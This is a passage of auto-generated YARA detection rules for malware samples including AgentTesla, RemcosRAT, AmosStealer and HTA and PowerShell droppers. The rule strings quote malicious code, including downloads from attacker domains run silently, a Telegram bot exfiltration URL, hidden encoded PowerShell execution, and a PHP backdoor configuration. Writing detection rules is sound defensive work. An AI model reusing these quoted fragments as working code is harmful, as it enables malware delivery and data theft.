      $s10 = "        Advapi32.GetTokenInformation(hToken, TokenElevation, addressof(IsElevated), sizeof(IsElevated), addressof(cbSize))" fullword ascii /* score: '22.00'*/
      $s11 = "        tPath = \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\";" fullword ascii /* score: '22.00'*/
      $s12 = "TokenElevation = 20;" fullword ascii /* score: '19.00'*/
      $s13 = "User32 = WinDLL(\"User32.dll\");" fullword ascii /* score: '19.00'*/
      $s14 = "botinfo.iselevated = CheckElevation();" fullword ascii /* score: '19.00'*/
      $s15 = "Winhttp = WinDLL(\"Winhttp.dll\");" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x7266 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule a6821c7e9bfe2e6af0f690d906ec6a26161e2198c256fb60f3b4731c317f3ad9_a6821c7e {
   meta:
      description = "dropzone - file a6821c7e9bfe2e6af0f690d906ec6a26161e2198c256fb60f3b4731c317f3ad9_a6821c7e.hta"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a6821c7e9bfe2e6af0f690d906ec6a26161e2198c256fb60f3b4731c317f3ad9"
   strings:
      $s1 = "    tempPath = shell.ExpandEnvironmentStrings(\"%TEMP%\")" fullword ascii /* score: '18.00'*/
      $s2 = "                \"https://google.flicxd2.com/ge-ge/LAN_DCH_Realtek_D_V5.exe\")" fullword ascii /* score: '12.00'*/
      $s3 = "                \"https://google.flicxd2.com/ge-ge/LAN_DCH_Realtek_D_V3.exe\", _" fullword ascii /* score: '12.00'*/
      $s4 = "    urls = Array(\"https://google.flicxd2.com/ge-ge/LAN_DCH_Realtek_D_V1.exe\", _" fullword ascii /* score: '12.00'*/
      $s5 = "                \"https://gmail.koomartin.com/ge-ge/LAN_DCH_Realtek_D_V4.exe\", _" fullword ascii /* score: '12.00'*/
      $s6 = "                \"https://gmail.koomartin.com/ge-ge/LAN_DCH_Realtek_D_V2.exe\", _" fullword ascii /* score: '12.00'*/
      $s7 = "        shell.Run \"\"\"\" & exePath & \"\"\"\", 0, True" fullword ascii /* score: '10.00'*/
      $s8 = "    Set shell = CreateObject(\"WScript.Shell\")" fullword ascii /* score: '10.00'*/
      $s9 = "        tgUrl = \"https://api.telegram.org/bot\" & botToken & \"/sendMessage?chat_id=\" & chatId & \"&text=\" & message" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 6KB and
      all of them
}

rule sig_9cde726f3e0640b859cf88099d6987b26fa45bd38c4bbba87aaa58d5af1055da_9cde726f {
   meta:
      description = "dropzone - file 9cde726f3e0640b859cf88099d6987b26fa45bd38c4bbba87aaa58d5af1055da_9cde726f.unknown"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9cde726f3e0640b859cf88099d6987b26fa45bd38c4bbba87aaa58d5af1055da"
   strings:
      $s1 = "                'allow_passwd_public' => get_option($GLOBALS['YII_CONFIG']['keys']['allow_passwd_public'])," fullword ascii /* score: '16.00'*/
      $s2 = "            'url_form' => 'https://stegozaurus.cc/wp/widget_fix.txt'," fullword ascii /* score: '14.00'*/
      $s3 = "                'allow_passwd_trash' => get_option($GLOBALS['YII_CONFIG']['keys']['allow_passwd_trash'])," fullword ascii /* score: '13.00'*/
      $s4 = "                'allow_upload_plugin' => get_option($GLOBALS['YII_CONFIG']['keys']['allow_upload_plugin'])," fullword ascii /* score: '12.00'*/
      $s5 = "                $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];" fullword ascii /* score: '10.00'*/
      $s6 = "            $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];" fullword ascii /* score: '10.00'*/
      $s7 = "                'url_steg' => get_option($GLOBALS['YII_CONFIG']['keys']['url_steg'])," fullword ascii /* score: '10.00'*/
      $s8 = "                'email' => get_option($GLOBALS['YII_CONFIG']['keys']['email'])," fullword ascii /* score: '10.00'*/
      $s9 = "                        $rukyzug = get_option($GLOBALS['YII_CONFIG']['keys'][$rijyce_hukhysaw], false);" fullword ascii /* score: '10.00'*/
      $s10 = "                'email_use_always' => get_option($GLOBALS['YII_CONFIG']['keys']['email_use_always'])," fullword ascii /* score: '10.00'*/
      $s11 = "                    $rukyzug = get_option($GLOBALS['YII_CONFIG']['keys'][$rijyce_hukhysaw], false);" fullword ascii /* score: '10.00'*/
      $s12 = "                        if ((!isset($_COOKIE[$texoxe_zhyliduth])) && (!isset($_POST[$texoxe_zhyliduth]))) {" fullword ascii /* score: '10.00'*/
      $s13 = "                'url_java' => get_option($GLOBALS['YII_CONFIG']['keys']['url_java'])," fullword ascii /* score: '10.00'*/
      $s14 = "                'allow_old_plugin' => get_option($GLOBALS['YII_CONFIG']['keys']['allow_old_plugin'])" fullword ascii /* score: '10.00'*/
      $s15 = "                'url_form' => get_option($GLOBALS['YII_CONFIG']['keys']['url_form'])," fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6c63 and filesize < 100KB and
      8 of them
}

rule fdfda3c8f1d56bd759250650f726f10b_imphash_ {
   meta:
      description = "dropzone - file fdfda3c8f1d56bd759250650f726f10b(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9659dd5f854f5237f51c6bc00dd6146a0730da974fc1ae937b31b76f69b13f4f"
   strings:
      $s1 = "Error opening process." fullword ascii /* score: '18.00'*/
      $s2 = "Notepad.exe not running. Run Notepad first." fullword ascii /* score: '17.00'*/
      $s3 = "Error when hijacking thread." fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule sig_61e6b7d1e477c572c6b9549dea8ce5ba977afd11331a56efe7f36a92f02d5a49_61e6b7d1 {
   meta:
      description = "dropzone - file 61e6b7d1e477c572c6b9549dea8ce5ba977afd11331a56efe7f36a92f02d5a49_61e6b7d1.ps1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "61e6b7d1e477c572c6b9549dea8ce5ba977afd11331a56efe7f36a92f02d5a49"
   strings:
      $x1 = "$DATA = \"=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '53.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                         ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0" ascii /* base64 encoded string '                        ' */ /* score: '25.00'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                   8' */ /* score: '22.00'*/
      $s8 = "PGeyDdSShPZGptdCcWw4MUUmIxSF5jj+QCty6CDYoJT/3n8szMVsb7CyNyodqF+vfAC34OoZ4EYetsBIoq1EdilfSdMJYG6XlRHYQunjqygn3dqswn0pTSw15+FTPjYd" ascii /* score: '21.00'*/
      $s9 = "J6xwbt5Cxuv/FIRCV9BHMj1pJRP0vqMsm3YzP5FOZXLR0v/WfF9SjaEicMd9sclBBWiWLuXMzGUYbjuRYUwId1aCtZe15ScXQMMTcT//NaVbYwF+zL0MFVJ3O6nPGIAl" ascii /* score: '19.00'*/
      $s10 = "buI9SQeBeTnCxWcOmKWhulrx9IYHLfLgu2WJH5YtG8Awy9XB3zWbudsLQMgink3/cMF1T+hlEGQDNz/+ZZNaHhPmPzdd9H+3zqw5gDFXJbLMgjnApD26i64ysBirc9zl" ascii /* score: '19.00'*/
      $s11 = "5gpOAtdGj5l/brQPDKxN3UCBbKHYeWTVpaK6Jz017d8zqITv3Wp60XokrunhK5NOIMyM5XWeJeBLI7GAvI5dLnY1YgLu8H9dllldtlVa8dazdZZVC8gOHXuWQU2iAunS" ascii /* score: '19.00'*/
      $s12 = "    $loader = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($loaderAddr, $loaderDelegate)" fullword ascii /* score: '19.00'*/
      $s13 = "t4JlJCmG/j6jzcDdZiKTUILVIXExvKVuCXjRa8NVZNaTKivaTtbApjaY5luLwus3U0reekEYe/yalV0BAJXzyT9w34F5/itBHXCBeULh1WCz3plGRrYnDMH9f3tnn06a" ascii /* score: '19.00'*/
      $s14 = "JGMMcqWvNn9/dwvzAxH76XDCbINs43nTB08f5WB2BO6UzpiNQBiuGzAO/rqTRZTHaVXWhEYeIPKWAXG7UOXpyAR+TTgOX+ohEgzqCuW1oi3U1T46Fk6XmLzlEtaaXZne" ascii /* score: '19.00'*/
      $s15 = "gedjFicKuDRRBKtSkxto0hm41YJyavrvfj96kX6EzB9iog0C52wYGNmtuub574rAnoZi2WYrFPNV5Z1MGPNKEYos/x6QuTzF1/JT1xL9HSCE+zk+XFTP7WOLSbXyWF8L" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule acee1beb7514962948a85ee7fd203977c79e737fe50774ad2a6b115b4c0b1573_acee1beb {
   meta:
      description = "dropzone - file acee1beb7514962948a85ee7fd203977c79e737fe50774ad2a6b115b4c0b1573_acee1beb.dmg"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "acee1beb7514962948a85ee7fd203977c79e737fe50774ad2a6b115b4c0b1573"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */ /* score: '26.50'*/
      $s3 = "eAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                       ' */ /* score: '26.00'*/
      $s4 = "AAAAAAAAAAAAD" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAD" ascii /* base64 encoded string '           ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAACE" ascii /* base64 encoded string '       !' */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAAAAAAAA" fullword ascii /* base64 encoded string '                      @ @       ' */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAABAAAAAAAAAAAA" ascii /* base64 encoded string '        @        ' */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAAAF" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAA" ascii /* base64 encoded string '                      @ ' */ /* score: '16.50'*/
      $s11 = "aAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA" ascii /* base64 encoded string '    @               @        ' */ /* score: '16.00'*/
      $s12 = "aAAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */ /* score: '14.00'*/
      $s13 = "AAAAAAAAAAAAAABmAAAAAAAAAAA=" fullword ascii /* base64 encoded string '           f        ' */ /* score: '14.00'*/
      $s14 = "AAAAAAAAAAAAAADYAAAAAAAAAAA=" fullword ascii /* base64 encoded string '          6        ' */ /* score: '14.00'*/
      $s15 = "8AAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0xda78 and filesize < 4000KB and
      8 of them
}

rule AmosStealer_signature__2 {
   meta:
      description = "dropzone - file AmosStealer(signature).dmg"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ff82d43333ac79993d6f1fc59eb6850cbfa3d732e01ce33efbac81a4797b6b56"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */ /* score: '26.50'*/
      $s3 = "NUsers/user/Downloads/infosec_hello/builder_cache/DJInAqpeht/rw.15937.Setup.dmg" fullword ascii /* score: '17.00'*/
      $s4 = "P/:Users:user:Downloads:infosec_hello:builder_cache:DJInAqpeht:rw.15937.Setup.dmg" fullword ascii /* score: '17.00'*/
      $s5 = "AAAAAAAAAAAAAAD" ascii /* base64 encoded string '           ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAAAAAAAA" fullword ascii /* base64 encoded string '                      @ @       ' */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAA" ascii /* base64 encoded string '                      @ ' */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAD" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '             ' */ /* score: '16.50'*/
      $s11 = "aAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA" ascii /* base64 encoded string '    @               @        ' */ /* score: '16.00'*/
      $s12 = "uN.ExE" fullword ascii /* score: '16.00'*/
      $s13 = "aAAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */ /* score: '14.00'*/
      $s14 = "AAAAAAAAAAAAAABmAAAAAAAAAAA=" fullword ascii /* base64 encoded string '           f        ' */ /* score: '14.00'*/
      $s15 = "8AAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0xda78 and filesize < 10000KB and
      8 of them
}

rule sig_6e1f8c1e1cca597ee5864acbdd13a4a8711d2029e9651097a694e15776e67fe2_6e1f8c1e {
   meta:
      description = "dropzone - file 6e1f8c1e1cca597ee5864acbdd13a4a8711d2029e9651097a694e15776e67fe2_6e1f8c1e.vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6e1f8c1e1cca597ee5864acbdd13a4a8711d2029e9651097a694e15776e67fe2"
   strings:
      $x1 = "sh.Run \"powershell.exe -W Hidden -EncodedCommand \" & encoded, 0, False" fullword ascii /* score: '37.00'*/
      $s2 = "encoded = \"IwAgAEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ADQAKACQAZQBpAHoAcwBmAGIAdAB0AGcAbABxAGEAbQB5AHkAawB3AGIAbQAgAD0AIAAiAGgAdAB0" ascii /* score: '17.00'*/
      $s3 = "titles = Array(\"System Process\", \"Windows Update\", \"Runtime Broker\")" fullword ascii /* score: '15.00'*/
      $s4 = "CQAaABtAHoAcwBwAHUAZQBcACQAcQBnAGYAZgB3AHgAdwBjAGMAawB4AHIAaABjAHcAawBpACIAKQApACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAZgBqAHEAdAB2A" ascii /* score: '12.00'*/
      $s5 = "HcAdgB4AHUAZQBvAHkAeQAgAD0AIAAkAGwAZgBrAGIAZQB1AHEAdgBqAGMAZAB5AGcAbQBuAHIAYQAuAEkAdABlAG0AcwAoACkADQAKACQAYQB5AGYAZAB0AHAAdABvA" ascii /* score: '12.00'*/
      $s6 = "Set sh = CreateObject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
      $s7 = "encoded = \"IwAgAEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ADQAKACQAZQBpAHoAcwBmAGIAdAB0AGcAbABxAGEAbQB5AHkAawB3AGIAbQAgAD0AIAAiAGgAdAB0" ascii /* score: '12.00'*/
      $s8 = "CQAZgBqAHEAdAB2AGwAeABkAHMAcABvAHUAbwB1AGEAKQAgAHsADQAKACAAIAAgACAAIwAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAdwB2AHUAYgB0AHEAaQB6A" ascii /* score: '12.00'*/
      $s9 = "GUAbABsAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuAA0ACgAkAGwAZgBrAGIAZQB1AHEAdgBqAGMAZAB5AGcAbQBuAHIAYQAgAD0AIAAkAHIAcwBuAGcAcwAuAE4AYQBtA" ascii /* score: '12.00'*/
      $s10 = "HkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAUgBhAG4AZABvAG0ARgBpAGwAZQBOAGEAbQBlACgAKQANAAoAJAB3AHYAdQBiAHQAcQBpAHoAIAA9A" ascii /* score: '11.00'*/
      $s11 = "AC0AbAB0ACAA" ascii /* base64 encoded string ' - l t   ' */ /* score: '10.00'*/
      $s12 = "Dim encoded" fullword ascii /* score: '9.00'*/
      $s13 = "randomTitle = titles(Int((UBound(titles) + 1) * Rnd))" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6e4f and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__2 {
   meta:
      description = "dropzone - file AgentTesla(signature).vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ffbb2562e2cfdfa7601c57d3dd01b9b77e519c18cf592fbe184c9be2a4285ad6"
   strings:
      $s1 = "SSMON_LogError \"Most likely, your system is missing phials freeware SMTP component from http://www.ostrosoft.com/smtp.html\"" fullword ascii /* score: '30.00'*/
      $s2 = "WScript.Echo \"/ConfigFile:\"\"\" & deterioration & \"\"\" Polling Frequency: \" & reportage.pocketed & \" seconds. \" & enology" ascii /* score: '30.00'*/
      $s3 = "WScript.Echo \"/ConfigFile:\"\"\" & deterioration & \"\"\" Polling Frequency: \" & reportage.pocketed & \" seconds. \" & enology" ascii /* score: '30.00'*/
      $s4 = "Set nonrelationship = sugarbeets.Execute( in_vssEvent.passance )" fullword ascii /* score: '29.00'*/
      $s5 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s6 = "Set negroes = pouteria.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s7 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s8 = "Set epentheses = pouteria.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s9 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s10 = "WScript.Sleep( reportage.pocketed * 1000 )" fullword ascii /* score: '20.00'*/
      $s11 = "monochromic = plasmodiophora.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s12 = "' Execute phials regular express" fullword ascii /* score: '18.00'*/
      $s13 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s14 = "' Dump each hindrance" fullword ascii /* score: '18.00'*/
      $s15 = "' Dump phials current hindrance status" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule AgentTesla_signature__ddb6dc98 {
   meta:
      description = "dropzone - file AgentTesla(signature)_ddb6dc98.vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ddb6dc98283c5ce029fc0d34009b6a284df76cf81f9de895872277ebfb0355e7"
   strings:
      $s1 = "SSMON_LogError \"Most likely, your system is missing stameniferous freeware SMTP component from http://www.ostrosoft.com/smtp.ht" ascii /* score: '30.00'*/
      $s2 = "SSMON_LogError \"Most likely, your system is missing stameniferous freeware SMTP component from http://www.ostrosoft.com/smtp.ht" ascii /* score: '30.00'*/
      $s3 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s4 = "Set gusli = faitor.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s5 = "Set cookers = belletristic.Execute( in_vssEvent.pseudoperculate )" fullword ascii /* score: '26.00'*/
      $s6 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s7 = "Set gutterball = faitor.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s8 = "WScript.Echo \"/ConfigFile:\"\"\" & queint & \"\"\" Polling Frequency: \" & dibenzazepines.sexpert & \" seconds. \" & mahaly( in" ascii /* score: '22.00'*/
      $s9 = "WScript.Echo \"/ConfigFile:\"\"\" & queint & \"\"\" Polling Frequency: \" & dibenzazepines.sexpert & \" seconds. \" & mahaly( in" ascii /* score: '22.00'*/
      $s10 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s11 = "scolies = cicisbeism.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s12 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s13 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s14 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s15 = "' Dump each halftones" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule RemcosRAT_signature_ {
   meta:
      description = "dropzone - file RemcosRAT(signature).vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "89f379f3c244456381a5ac1ffa1530471ef70db4e1a2dd91068ffbc095273dd8"
   strings:
      $s1 = "SSMON_LogError \"Most likely, your system is missing automaticities freeware SMTP component from http://www.ostrosoft.com/smtp.h" ascii /* score: '30.00'*/
      $s2 = "SSMON_LogError \"Most likely, your system is missing automaticities freeware SMTP component from http://www.ostrosoft.com/smtp.h" ascii /* score: '30.00'*/
      $s3 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s4 = "Set anathem = parabematic.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s5 = "Set infradominant = skull.Execute( in_vssEvent.lipogenys )" fullword ascii /* score: '26.00'*/
      $s6 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s7 = "Set pollet = parabematic.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s8 = "WScript.Echo \"/ConfigFile:\"\"\" & amatorially & \"\"\" Polling Frequency: \" & aketon.succored & \" seconds. \" & sycoma( cree" ascii /* score: '22.00'*/
      $s9 = "WScript.Echo \"/ConfigFile:\"\"\" & amatorially & \"\"\" Polling Frequency: \" & aketon.succored & \" seconds. \" & sycoma( cree" ascii /* score: '22.00'*/
      $s10 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s11 = "demigoddesses = cornhusker.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s12 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s13 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s14 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s15 = "' Increment automaticities number of comment lines processed" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule RemcosRAT_signature__ac4f52f2 {
   meta:
      description = "dropzone - file RemcosRAT(signature)_ac4f52f2.vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ac4f52f2a9cd30338e5a41ed8330255617f8f51899e14e6199c64f4df54f6e34"
   strings:
      $x1 = "Set amblyopes = wattevillite.Execute( in_vssEvent.hospitably )" fullword ascii /* score: '31.00'*/
      $s2 = "SSMON_LogError \"Most likely, your system is missing clubability freeware SMTP component from http://www.ostrosoft.com/smtp.html" ascii /* score: '30.00'*/
      $s3 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s4 = "Set Bamdoos = supering.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s5 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s6 = "Set mainpernor = supering.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s7 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s8 = "' Dump clubability current tokenisations status" fullword ascii /* score: '21.00'*/
      $s9 = "' Dump each tokenisations" fullword ascii /* score: '21.00'*/
      $s10 = "perimenopause = endexoteric.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s11 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s12 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s13 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s14 = "WScript.Echo \"/ConfigFile:\"\"\" & corypha & \"\"\" Polling Frequency: \" & walkway.anticatarrhals & \" seconds. \" & candleber" ascii /* score: '18.00'*/
      $s15 = "WScript.Echo \"/ConfigFile:\"\"\" & corypha & \"\"\" Polling Frequency: \" & walkway.anticatarrhals & \" seconds. \" & candleber" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__ed971bcf {
   meta:
      description = "dropzone - file RemcosRAT(signature)_ed971bcf.vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ed971bcfc5a9eebfbecc9aab050ffb9e6d9cfe38a72fd6f74cfec39cbd31475f"
   strings:
      $s1 = "SSMON_LogError \"Most likely, your system is missing baglike freeware SMTP component from http://www.ostrosoft.com/smtp.html\"" fullword ascii /* score: '30.00'*/
      $s2 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s3 = "Set lyophilization = vagrom.Execute( in_vssEvent.coulisse )" fullword ascii /* score: '26.00'*/
      $s4 = "Set verteber = destroyest.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s5 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s6 = "Set ludwigia = destroyest.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s7 = "WScript.Echo \"/ConfigFile:\"\"\" & taiko & \"\"\" Polling Frequency: \" & proturan.anamniotic & \" seconds. \" & tolter( hoopst" ascii /* score: '22.00'*/
      $s8 = "WScript.Echo \"/ConfigFile:\"\"\" & taiko & \"\"\" Polling Frequency: \" & proturan.anamniotic & \" seconds. \" & tolter( hoopst" ascii /* score: '22.00'*/
      $s9 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s10 = "monastery = purpurescent.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s11 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s12 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s13 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s14 = "WScript.Echo postcolumellar( in_strHeader )" fullword ascii /* score: '18.00'*/
      $s15 = "micropositioner.chauvinistic = Left( micropositioner.chauvinistic, interungulate - 1 )" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule RemcosRAT_signature__2 {
   meta:
      description = "dropzone - file RemcosRAT(signature).bat"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c27c268267db57d97a6378bb91ac9e6cfd25da852e083269bd14a11797b0294d"
   strings:
